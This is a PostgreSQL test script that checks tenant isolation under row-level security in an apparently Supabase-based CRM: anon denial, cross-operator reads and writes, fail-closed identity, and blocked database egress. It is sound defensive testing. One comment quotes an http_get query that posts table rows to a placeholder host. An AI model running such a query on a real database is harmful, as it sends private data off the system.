-- Automated RLS / tenant-isolation assertions.
--
-- Phase 0.5B proved these properties by hand, once, against a live database.
-- A one-off manual check is not a guarantee: it does not run again when someone
-- edits a policy. This file is the executable form.
--
-- HOW IT RUNS: the whole file is one transaction that ends in ROLLBACK, so it
-- creates its fixtures, asserts against them, and leaves the database exactly as
-- it found it. Any failed assertion raises, which aborts the transaction and
-- makes psql exit non-zero. Run it with `npm run test:db` (scripts/run-db-tests.mjs).
--
-- WHAT "TENANT" MEANS HERE, precisely: this schema has no tenant column. The
-- only isolation boundary that exists today is the `sales` row derived from
-- `auth.uid()` via `public.current_sales_id()`. So "Tenant A cannot read Tenant
-- B" is asserted as "sales user A cannot read rows owned by sales user B". When
-- a real tenant/company boundary lands (ADR 0012), these assertions must be
-- re-pointed at it -- they are deliberately written to fail loudly rather than
-- to keep passing against a boundary that no longer means what it meant.

\set ON_ERROR_STOP on

begin;

-- ---------------------------------------------------------------------------
-- Fixtures: two ordinary operators and one owner/administrator, one contact
-- each. Inserting into auth.users fires public.handle_new_user, which creates
-- the matching public.sales row -- the same path a real signup takes.
-- ---------------------------------------------------------------------------

insert into auth.users (id, instance_id, aud, role, email, encrypted_password,
                        email_confirmed_at, created_at, updated_at,
                        raw_app_meta_data, raw_user_meta_data)
values
  ('aaaaaaaa-0000-0000-0000-000000000001','00000000-0000-0000-0000-000000000000',
   'authenticated','authenticated','rls-a@test.local','x',now(),now(),now(),'{}',
   '{"first_name":"Alpha","last_name":"Operator"}'),
  ('bbbbbbbb-0000-0000-0000-000000000002','00000000-0000-0000-0000-000000000000',
   'authenticated','authenticated','rls-b@test.local','x',now(),now(),now(),'{}',
   '{"first_name":"Beta","last_name":"Operator"}'),
  ('cccccccc-0000-0000-0000-000000000003','00000000-0000-0000-0000-000000000000',
   'authenticated','authenticated','rls-owner@test.local','x',now(),now(),now(),'{}',
   '{"first_name":"Omega","last_name":"Owner"}'),
  ('dddddddd-0000-0000-0000-000000000004','00000000-0000-0000-0000-000000000000',
   'authenticated','authenticated','rls-disabled@test.local','x',now(),now(),now(),'{}',
   '{"first_name":"Delta","last_name":"Disabled"}');

-- The signup trigger can only ever produce an operator (it hardcodes
-- administrator=false, role='operator'). Promote one by hand so the admin-bypass
-- branch of the policies is actually exercised.
update public.sales set role = 'owner', administrator = true
 where user_id = 'cccccccc-0000-0000-0000-000000000003';

update public.sales set disabled = true
 where user_id = 'dddddddd-0000-0000-0000-000000000004';

insert into public.contacts (first_name, last_name, sales_id)
select 'Contact', 'OfAlpha', s.id from public.sales s
 where s.user_id = 'aaaaaaaa-0000-0000-0000-000000000001';

insert into public.contacts (first_name, last_name, sales_id)
select 'Contact', 'OfBeta', s.id from public.sales s
 where s.user_id = 'bbbbbbbb-0000-0000-0000-000000000002';

-- The disabled user MUST own a contact. Without one, assertion 4c passes for
-- the wrong reason: a disabled user with nothing of its own reads zero rows
-- even when `disabled` is being ignored entirely. Mutation-testing caught
-- exactly that -- removing the `disabled = false` predicate from
-- `current_sales_id()` left the suite green until this row was added.
insert into public.contacts (first_name, last_name, sales_id)
select 'Contact', 'OfDisabled', s.id from public.sales s
 where s.user_id = 'dddddddd-0000-0000-0000-000000000004';

-- Record the ids the assertions compare against.
create temporary table rls_fixture on commit drop as
select
  (select id from public.sales where user_id = 'aaaaaaaa-0000-0000-0000-000000000001') as sales_a,
  (select id from public.sales where user_id = 'bbbbbbbb-0000-0000-0000-000000000002') as sales_b,
  (select id from public.contacts where last_name = 'OfAlpha') as contact_a,
  (select id from public.contacts where last_name = 'OfBeta') as contact_b;

-- ===========================================================================
-- 1. ANON IS DENIED
--    anon must hold no privilege at all, so the failure is a hard 42501 from
--    the grant layer -- it never even reaches RLS. Asserting the ERROR (rather
--    than "returns 0 rows") is the point: a 0-row read would mean anon can
--    reach the relation and is merely filtered, which is a weaker guarantee.
-- ===========================================================================

do $$
declare
  v_rel text;
  v_reached text[] := '{}';
begin
  foreach v_rel in array array[
    'contacts', 'companies', 'contact_notes', 'deals', 'deal_notes', 'tasks',
    'tags', 'sales', 'configuration', 'lead_profiles', 'loss_reasons',
    'acquisition_attributions', 'contacts_summary', 'companies_summary',
    'activity_log', 'init_state'
  ] loop
    begin
      execute 'set local role anon';
      execute format('select 1 from public.%I limit 1', v_rel);
      v_reached := array_append(v_reached, v_rel);
    exception
      when insufficient_privilege then
        null; -- expected
    end;
    execute 'reset role';
  end loop;

  if array_length(v_reached, 1) is not null then
    raise exception 'anon reached %: unauthenticated callers must be refused by the grant layer, not merely filtered',
      array_to_string(v_reached, ', ');
  end if;
end
$$;

-- ===========================================================================
-- 2. TENANT A CANNOT READ TENANT B
--    Both through the base table and through contacts_summary. The view is
--    tested explicitly because a view that loses `security_invoker` bypasses
--    RLS completely while every base-table test still passes -- that exact
--    defect shipped in 20260911232039_pending_delta.sql and was invisible to
--    every check that only looked at policies.
-- ===========================================================================

do $$
declare
  v_n         bigint;
  v_contact_b bigint;
begin
  select contact_b into v_contact_b from rls_fixture;

  set local role authenticated;
  set local request.jwt.claims = '{"sub":"aaaaaaaa-0000-0000-0000-000000000001"}';

  select count(*) into v_n from public.contacts;
  if v_n <> 1 then
    raise exception 'operator A sees % contacts through the base table, expected exactly its own 1', v_n;
  end if;

  select count(*) into v_n from public.contacts where id = v_contact_b;
  if v_n <> 0 then
    raise exception 'operator A can read operator B''s contact through the base table';
  end if;

  select count(*) into v_n from public.contacts_summary;
  if v_n <> 1 then
    raise exception
      'operator A sees % rows in contacts_summary, expected 1: the view is not applying the caller''s RLS (check security_invoker)', v_n;
  end if;

  select count(*) into v_n from public.contacts_summary where id = v_contact_b;
  if v_n <> 0 then
    raise exception 'operator A can read operator B''s contact through contacts_summary';
  end if;

  reset role;
end
$$;

-- ---------------------------------------------------------------------------
-- 2b. The OTHER scoped relations. Added after mutation-testing showed that
--     widening `sales_select_scoped` or `lead_profile_select_scoped` left the
--     suite green: asserting only on `contacts` does not cover them.
--
--     `lead_profiles` matters most. It carries `do_not_contact` -- the consent
--     flag -- and `operational_status` for a clinical lead. `sales` leaks
--     colleagues' names and email addresses.
-- ---------------------------------------------------------------------------

insert into public.acquisition_attributions (contact_id, source)
select contact_a, 'test-source-a' from rls_fixture;
insert into public.acquisition_attributions (contact_id, source)
select contact_b, 'test-source-b' from rls_fixture;

do $$
declare
  v_n         bigint;
  v_contact_b bigint;
begin
  select contact_b into v_contact_b from rls_fixture;

  set local role authenticated;
  set local request.jwt.claims = '{"sub":"aaaaaaaa-0000-0000-0000-000000000001"}';

  -- lead_profiles rows are created by the create_lead_profile_for_contact
  -- trigger, so each contact has exactly one.
  select count(*) into v_n from public.lead_profiles where contact_id = v_contact_b;
  if v_n <> 0 then
    raise exception
      'operator A can read the lead_profile of operator B''s contact -- that row holds the do_not_contact consent flag';
  end if;

  select count(*) into v_n from public.lead_profiles;
  if v_n <> 1 then
    raise exception 'operator A sees % lead_profiles, expected exactly its own 1', v_n;
  end if;

  select count(*) into v_n from public.acquisition_attributions where contact_id = v_contact_b;
  if v_n <> 0 then
    raise exception 'operator A can read the acquisition attribution of operator B''s contact';
  end if;

  -- An operator may see its own sales row and no other. Anything wider hands
  -- every colleague's email to every user.
  select count(*) into v_n from public.sales;
  if v_n <> 1 then
    raise exception 'operator A sees % sales rows, expected exactly its own 1', v_n;
  end if;

  reset role;
end
$$;

-- ===========================================================================
-- 3. TENANT A CANNOT MUTATE TENANT B
--    Three separate verbs. UPDATE and DELETE fail silently as 0 affected rows
--    (RLS filters the target out), INSERT fails loudly on the WITH CHECK.
--    Asserting all three matters: "cannot read" does not imply "cannot write",
--    and an UPDATE that reports success while changing nothing is the shape
--    that hides a broken policy.
-- ===========================================================================

do $$
declare
  v_n           bigint;
  v_sales_b     bigint;
  v_contact_b   bigint;
  v_insert_blocked boolean := false;
begin
  select sales_b, contact_b into v_sales_b, v_contact_b from rls_fixture;

  set local role authenticated;
  set local request.jwt.claims = '{"sub":"aaaaaaaa-0000-0000-0000-000000000001"}';

  update public.contacts set first_name = 'Hijacked' where id = v_contact_b;
  get diagnostics v_n = row_count;
  if v_n <> 0 then
    raise exception 'operator A updated % of operator B''s contact rows', v_n;
  end if;

  delete from public.contacts where id = v_contact_b;
  get diagnostics v_n = row_count;
  if v_n <> 0 then
    raise exception 'operator A deleted % of operator B''s contact rows', v_n;
  end if;

  begin
    insert into public.contacts (first_name, last_name, sales_id)
    values ('Planted', 'IntoBeta', v_sales_b);
  exception
    when insufficient_privilege then
      v_insert_blocked := true;
  end;
  if not v_insert_blocked then
    raise exception 'operator A inserted a contact owned by operator B';
  end if;

  reset role;
end
$$;

-- ---------------------------------------------------------------------------
-- 3b. UNQUALIFIED mutations. This block exists because mutation-testing the
--     targeted statements above showed they DO NOT catch a broken UPDATE or
--     DELETE policy.
--
--     Measured on 2026-09-11 with ONLY `contact_update_scoped` widened to
--     `is_active_sales_user()` (the SELECT policy left correct):
--        update contacts set first_name='X' where last_name='OfBeta'  -> 0 rows
--        update contacts set first_name='X'                           -> 2 rows
--     PostgreSQL applies SELECT policies to an UPDATE only when the statement
--     references columns (a WHERE clause counts). An unqualified UPDATE
--     references none, so the UPDATE policy governs alone -- and operator A
--     rewrote operator B's contact. The targeted form is masked by the SELECT
--     policy and stays green throughout.
--
--     Wrapped in a savepoint: an unqualified mutation legitimately touches the
--     caller's OWN rows, and the later assertions need the fixtures intact.
-- ---------------------------------------------------------------------------

savepoint before_unqualified;

do $$
declare
  v_name text;
  v_n    bigint;
begin
  set local role authenticated;
  set local request.jwt.claims = '{"sub":"aaaaaaaa-0000-0000-0000-000000000001"}';
  update public.contacts set first_name = 'UnqualifiedWrite';
  reset role;

  select first_name into v_name from public.contacts where last_name = 'OfBeta';
  if v_name is distinct from 'Contact' then
    raise exception
      'an UNQUALIFIED update by operator A rewrote operator B''s contact (first_name = %). The UPDATE policy is not scoped; a targeted update would not have revealed this.', v_name;
  end if;

  set local role authenticated;
  set local request.jwt.claims = '{"sub":"aaaaaaaa-0000-0000-0000-000000000001"}';
  delete from public.contacts;
  reset role;

  select count(*) into v_n from public.contacts where last_name = 'OfBeta';
  if v_n <> 1 then
    raise exception
      'an UNQUALIFIED delete by operator A removed operator B''s contact. The DELETE policy is not scoped.';
  end if;
end
$$;

rollback to savepoint before_unqualified;

-- Verify outside the caller's own view that nothing actually changed. Step 3
-- ran as operator A, so it could not have observed a successful write anyway --
-- this check is what distinguishes "A could not see the change" from "the
-- change did not happen".
do $$
declare
  v_name text;
  v_n    bigint;
begin
  select first_name into v_name from public.contacts where last_name = 'OfBeta';
  if v_name is distinct from 'Contact' then
    raise exception 'operator B''s contact was actually modified (first_name = %)', v_name;
  end if;
  select count(*) into v_n from public.contacts where last_name = 'IntoBeta';
  if v_n <> 0 then
    raise exception 'a contact was actually planted into operator B''s scope';
  end if;
end
$$;

-- ===========================================================================
-- 4. MISSING TENANT CONTEXT FAILS CLOSED
--    Three distinct ways the context can be absent. All must yield zero rows,
--    never "everything". This is the property that matters most for background
--    workers (ADR 0012): a worker that forgets to set its identity must read
--    nothing, not the whole table.
-- ===========================================================================

do $$
declare
  v_n bigint;
begin
  -- 4a. authenticated role, no JWT claims at all -> auth.uid() is null.
  set local role authenticated;
  set local request.jwt.claims = '';
  select count(*) into v_n from public.contacts;
  if v_n <> 0 then
    raise exception 'authenticated with NO jwt claims read % contacts; missing context must fail closed', v_n;
  end if;
  select count(*) into v_n from public.contacts_summary;
  if v_n <> 0 then
    raise exception 'authenticated with NO jwt claims read % rows from contacts_summary', v_n;
  end if;
  reset role;

  -- 4b. A well-formed JWT for a user that has no sales row at all.
  set local role authenticated;
  set local request.jwt.claims = '{"sub":"99999999-9999-9999-9999-999999999999"}';
  select count(*) into v_n from public.contacts;
  if v_n <> 0 then
    raise exception 'a JWT with no matching sales row read % contacts', v_n;
  end if;
  reset role;

  -- 4c. A real user whose sales row is disabled. Deactivation must take effect
  --     immediately at the data layer, not only in the UI.
  set local role authenticated;
  set local request.jwt.claims = '{"sub":"dddddddd-0000-0000-0000-000000000004"}';
  select count(*) into v_n from public.contacts;
  if v_n <> 0 then
    raise exception 'a DISABLED sales user read % contacts', v_n;
  end if;
  reset role;
end
$$;

-- ===========================================================================
-- 5. THE ADMIN BYPASS IS REAL AND SCOPED TO is_admin()
--    Asserted so that a change which accidentally grants every operator the
--    admin branch is caught here, rather than discovered in production.
-- ===========================================================================

do $$
declare
  v_n     bigint;
  v_total bigint;
begin
  select count(*) into v_total from public.contacts;

  set local role authenticated;
  set local request.jwt.claims = '{"sub":"cccccccc-0000-0000-0000-000000000003"}';
  select count(*) into v_n from public.contacts;
  if v_n <> v_total then
    raise exception 'the owner/administrator sees % of % contacts; the is_admin() branch is not working', v_n, v_total;
  end if;
  reset role;

  -- And an ordinary operator must NOT get that branch.
  set local role authenticated;
  set local request.jwt.claims = '{"sub":"bbbbbbbb-0000-0000-0000-000000000002"}';
  select count(*) into v_n from public.contacts;
  if v_n <> 1 then
    raise exception 'operator B sees % contacts; an operator must not reach the admin branch', v_n;
  end if;
  reset role;
end
$$;

-- ===========================================================================
-- 6. service_role IS A FULL BYPASS -- CHARACTERISED, NOT ENDORSED
--
--    This assertion PASSES when service_role reads everything. Read that
--    carefully: it is documenting a capability, not verifying a protection.
--    service_role is granted BYPASSRLS by the platform, so it is not, and can
--    never be, a tenant-isolation mechanism. Any component that runs as
--    service_role is INSIDE the trust boundary and carries the whole database.
--
--    It is asserted explicitly for one reason: so that nobody can point at a
--    green RLS suite and conclude that background workers are tenant-isolated.
--    They are not. Closing this is exactly what ADR 0012 is for, and ADR 0012
--    must not be accepted while this assertion still describes how workers run.
-- ===========================================================================

do $$
declare
  v_n bigint;
  v_total bigint;
begin
  select count(*) into v_total from public.contacts;

  set local role service_role;
  select count(*) into v_n from public.contacts;
  reset role;

  if v_n <> v_total then
    raise exception
      'service_role saw % of % contacts. This suite asserts the CURRENT posture (full bypass). If this now fails because the bypass was removed, that is progress: update ADR 0012 and this block together.',
      v_n, v_total;
  end if;
end
$$;

-- ===========================================================================
-- 7. THE GRANT SURFACE ITSELF
--    Independent of the assertions inside
--    20260911235000_close_anon_grants_and_view_invoker.sql, so that editing
--    that migration cannot quietly remove its own guard.
-- ===========================================================================

do $$
declare
  v_bad text;
begin
  select string_agg(format('%s:%s', c.relname, p.priv), ', ')
  into v_bad
  from pg_class c
  join pg_namespace n on n.oid = c.relnamespace
  cross join unnest(array['SELECT','INSERT','UPDATE','DELETE','TRUNCATE','REFERENCES','TRIGGER']) as p(priv)
  where n.nspname = 'public' and c.relkind in ('r','v')
    and has_table_privilege('anon', c.oid, p.priv);
  if v_bad is not null then
    raise exception 'anon holds privileges in schema public: %', v_bad;
  end if;

  -- TRUNCATE is not gated by RLS: a role holding it empties an RLS-protected
  -- table outright. Measured on 2026-09-11: as anon, `truncate lead_profiles`
  -- took it from 2 rows to 0 while every SELECT policy was in force.
  select string_agg(format('%s:%s', c.relname, p.priv), ', ')
  into v_bad
  from pg_class c
  join pg_namespace n on n.oid = c.relnamespace
  cross join unnest(array['TRUNCATE','REFERENCES','TRIGGER']) as p(priv)
  where n.nspname = 'public' and c.relkind in ('r','v')
    and has_table_privilege('authenticated', c.oid, p.priv);
  if v_bad is not null then
    raise exception 'authenticated holds RLS-defeating privileges: %', v_bad;
  end if;

  -- Every view an application role can read must apply the caller's policies.
  select string_agg(c.relname, ', ')
  into v_bad
  from pg_class c
  join pg_namespace n on n.oid = c.relnamespace
  where n.nspname = 'public' and c.relkind = 'v'
    and coalesce(array_to_string(c.reloptions, ','), '') not like '%security_invoker=on%'
    and (has_table_privilege('anon', c.oid, 'SELECT')
         or has_table_privilege('authenticated', c.oid, 'SELECT'));
  if v_bad is not null then
    raise exception 'view(s) % bypass RLS yet are readable by an application role', v_bad;
  end if;

  -- RLS must be enabled on every base table in public.
  select string_agg(c.relname, ', ')
  into v_bad
  from pg_class c
  join pg_namespace n on n.oid = c.relnamespace
  where n.nspname = 'public' and c.relkind = 'r' and not c.relrowsecurity;
  if v_bad is not null then
    raise exception 'table(s) % have RLS disabled', v_bad;
  end if;
end
$$;

-- ===========================================================================
-- 8. THE DATABASE IS NOT AN EGRESS CHANNEL
--    Guards 20260911130000_revoke_network_extension_privileges.sql. A
--    statement like `SELECT extensions.http_get('http://x/?d='||(select ...))`
--    is syntactically read-only, satisfies RLS, and posts rows off-box, so
--    `SET TRANSACTION READ ONLY` does not stop it.
-- ===========================================================================

do $$
declare
  v_role text;
begin
  foreach v_role in array array['anon','authenticated'] loop
    if has_schema_privilege(v_role, 'extensions', 'USAGE') then
      raise exception 'role % can reach schema extensions; the database is an egress channel', v_role;
    end if;
  end loop;

  -- pg_net is removed rather than revoked, because its `net` schema is owned by
  -- supabase_admin and a REVOKE issued by postgres is accepted and ignored (only
  -- the grantor may revoke). Measured before removal, as `authenticated`:
  -- `select net.http_get(...)` queued a request. Reinstalling the extension
  -- silently reopens that channel for anon AND authenticated, and no privilege
  -- change we can make would close it -- so its mere presence is the failure.
  if exists (select 1 from pg_extension where extname = 'pg_net') then
    raise exception
      'pg_net is installed. Its functions are granted to anon and authenticated by supabase_admin and cannot be revoked by this project; see ADR 0011 and 20260911235500_drop_pg_net.sql.';
  end if;
  if exists (select 1 from pg_namespace where nspname = 'net') then
    raise exception 'schema "net" exists; the pg_net egress channel is reachable';
  end if;
end
$$;

rollback;
